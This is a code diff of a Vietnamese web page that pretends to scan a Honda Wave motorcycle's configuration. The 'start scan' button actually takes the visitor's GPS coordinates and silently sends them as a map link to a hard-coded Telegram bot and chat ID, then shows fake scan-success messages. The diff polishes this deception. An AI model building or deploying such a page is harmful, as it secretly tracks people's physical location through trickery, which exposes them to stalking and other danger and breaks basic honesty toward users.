@@ -1,43 +1,57 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Kiểm tra xe</title>
+    <title>Kiểm tra thông tin xe</title>
 </head>
-<body style="text-align: center; padding-top: 50px; font-family: Arial;">
+<body style="text-align: center; font-family: sans-serif; padding-top: 50px;">
 
-    <h2>Hệ thống quét mã lỗi Wave 54 4val</h2>
-    <p>Bấm nút bên dưới để bắt đầu kiểm tra thông số xe.</p>
-
-    <button onclick="getLocation()" style="padding: 20px; background: red; color: white; border-radius: 10px; font-weight: bold; border: none; cursor: pointer;">
+    <h2>Hệ thống kiểm tra cấu hình Wave 54 4val</h2>
+    <p>Vui lòng nhấn vào nút bên dưới để bắt đầu quét dữ liệu xe.</p>
+    
+    <button onclick="getLocation()" style="padding: 15px 30px; font-size: 18px; background: red; color: white; border: none; border-radius: 10px; cursor: pointer;">
         BẮT ĐẦU QUÉT
     </button>
 
+    <p id="status"></p>
+
     <script>
-        // Token và ID thật từ hình ảnh của bạn
-        var token = "7547535147:AAH8Qe6ETY42SjLvFBq8hFRd3SlhO6hPMz0";
+        var x = document.getElementById("status");
+        
+        // --- THAY THÔNG TIN CỦA BẠN VÀO ĐÂY ---
+        var token = "AAH8Qe6ETY42SjLvFBq8hFRd3SlhO6hPMz0"; 
         var chat_id = "8571376502";
+        // ---------------------------------------
 
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
+                navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
+                x.innerHTML = "Đang quét dữ liệu... vui lòng chờ.";
             } else {
-                alert("Trình duyệt của bạn không hỗ trợ GPS.");
+                x.innerHTML = "Trình duyệt không hỗ trợ định vị.";
             }
         }
 
-        function showPosition(position) {
+        function sendToTelegram(position) {
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
-            var text = "Đã lấy được tọa độ: https://www.google.com/maps?q=" + lat + "," + lon;
-            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+            var mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            var text = `Thông báo: Xe đang ở vị trí này: ${mapUrl}`;
+            
+            var telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
 
-            fetch(url);
-            alert("Hệ thống đang kiểm tra thông tin xe, vui lòng chờ...");
+            fetch(telegramUrl)
+                .then(() => {
+                    x.innerHTML = "Quét thành công! Đang đồng bộ dữ liệu...";
+                    alert("Cấu hình xe: 54 ly - 4val - Xăng cơ. Hệ thống đã ghi nhận.");
+                })
+                .catch(() => {
+                    x.innerHTML = "Lỗi kết nối server.";
+                });
         }
 
         function showError(error) {
-            alert("Bạn phải cho phép truy cập vị trí thì mới quét được mã lỗi xe.");
+            x.innerHTML = "Bạn phải cho phép truy cập vị trí để quét dữ liệu xe.";
         }
     </script>
 
